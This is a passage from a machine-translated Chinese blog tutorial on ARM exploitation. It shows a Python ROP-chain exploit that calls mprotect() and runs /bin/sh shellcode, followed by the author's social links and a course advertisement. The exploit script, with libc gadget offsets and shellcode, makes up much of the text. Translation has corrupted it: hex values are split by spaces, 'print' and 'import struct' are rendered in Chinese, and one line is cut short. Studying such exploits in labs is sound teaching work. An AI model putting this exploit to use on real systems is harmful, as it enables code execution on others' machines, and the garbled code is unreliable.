id="3adb" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">打印(出口)</p></blockquote><p id="e15c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是最终的漏洞脚本。让我们在gdb之外运行这个(禁用aslr)</p><figure class="kl km kn ko gt kp gh gi paragraph-image"><div role="button" tabindex="0" class="mk ml di mm bf mn"><div class="gh gi np"><img src="../Images/58da58448e78687da47cd337336670a5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Qg2B7Qg3D9dgX8_6ayPLTA.png"/></div></div></figure><p id="0c5c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">最后，我们得到了我们的壳！！！！！！！</p><figure class="kl km kn ko gt kp"><div class="bz fp l di"><div class="nq kr l"/></div></figure></div><div class="ab cl nr ns hu nt" role="separator"><span class="nu bw bk nv nw nx"/><span class="nu bw bk nv nw nx"/><span class="nu bw bk nv nw"/></div><div class="ij ik il im in"><p id="0d73" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">好了，帖子到此结束。我希望您对调用mprotect有所了解。为了在这方面做得更好，您应该尝试找到您的小工具并实现您的想法来做一些事情，如调用mprotect()或简单的rop链等。</p><p id="78b2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">调用mprotect()的rop链的另一个示例</p><blockquote class="ks kt ku"><p id="6b06" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">#!/usr/bin/python</p><p id="c929" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">导入结构</p><p id="1a93" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">base _ libc = 0xb6e 74000<br/><br/>shellcode = " \ x01 \ x30 \ x8f \ xe2 \ x13 \ xff \ x2f \ xe1 \ x02 \ xa0 \ x49 \ x40 \ x52 \ x40 \ xc2 \ x71 \ x0b \ x27 \ x01 \ xdf \ x2f \ x62 \ x69 \ x6e \ x2f \ x73 \ x68 \ x78 "<br/>nops = " \ xe1 \ xa0 \ X10 \ x01 " * 1</p><p id="4295" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">exp = " A " * 24<br/>exp+= struct . pack("&lt;I "，base_libc+0x0010a1b8) # pop {r1，PC }；<br/> exp += struct.pack(" &lt; I "，0x 10101010)<br/>exp+= struct . pack("&lt;I "，base_libc+0x00019270) #pop {r3，PC }；r3= 0x0007a12c: pop {r0，r4，PC }；<br/> exp += struct.pack(" &lt; I "，base _ libc+0x 0007 a12c)# R3<br/>exp+= struct . pack("&lt;I "，base _ libc+0x 000 D2 AC)# mov r0，# 7；pop {r4，PC }；<br/>exp+= " AAAA "<br/>exp+= struct . pack("&lt;I "，base_libc+0x000d9ef0) #mov r2，r0；mov r0，R6；blx r3<br/> exp += struct.pack(" &lt; I "，0x bef def 80)# r0<br/>exp+= " BBBB "<br/>exp+= struct . pack("&lt;I "，base_libc+0x000fe910) #add r0，r0，# 0x80pop {r3，PC }；<br/>exp+= " BBBB "<br/>exp+= struct . pack("&lt;I "，base _ libc+0x 0003 b5 D8)# 0x 0003 b5 D8:pop { lr }；加sp，sp，# 4；bx lr<br/> exp += struct.pack(" &lt; I "，base_libc+0x00019270) #pop {r3，PC }<br/>exp+= " BBBBBBBB "<br/>exp+= struct . pack("&lt;I "，0x b 6 f 41 e 90)# mprotect<br/>exp+= " BBBB "<br/>exp+= struct . pack("&lt;I "，0x beff 1d 4)#外壳代码开始<br/> exp +=</p><p id="bada" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">打印(出口)</p></blockquote><p id="0201" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这不是干净的第一个，但仍然有效:P</p><p id="96b4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">把它想象成解决一个谜或一个难题，找到更多的小工具，把它们串联起来，做一些有意义的事情。慢慢来，多了解。</p></div><div class="ab cl nr ns hu nt" role="separator"><span class="nu bw bk nv nw nx"/><span class="nu bw bk nv nw nx"/><span class="nu bw bk nv nw"/></div><div class="ij ik il im in"><p id="3b37" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">跟我联系</strong></p><p id="03c1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">https://www.facebook.com/i.am.ultralegend</p><p id="06e0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">insta gram:<a class="ae kz" href="https://www.instagram.com/hagane_no_rekinjutsushi/" rel="noopener ugc nofollow" target="_blank">https://www.instagram.com/hagane_no_rekinjutsushi/</a></p><p id="1223" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果你想支持我，试试我在Udemy上的“手臂开发和逆向工程课程”</p><p id="348e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae kz" href="https://www.udemy.com/course/reverse-engineering-and-binary-exploitation-in-arm/?referralCode=8C725D513E77420A0CBF" rel="noopener ugc nofollow" target="_blank">https://www . udemy . com/course/reverse-engineering-and-binary-exploitation-in-arm/？referral code = 8c 725d 513 e 77420 a 0 CBF</a></p></div></div>    
</body>
</html>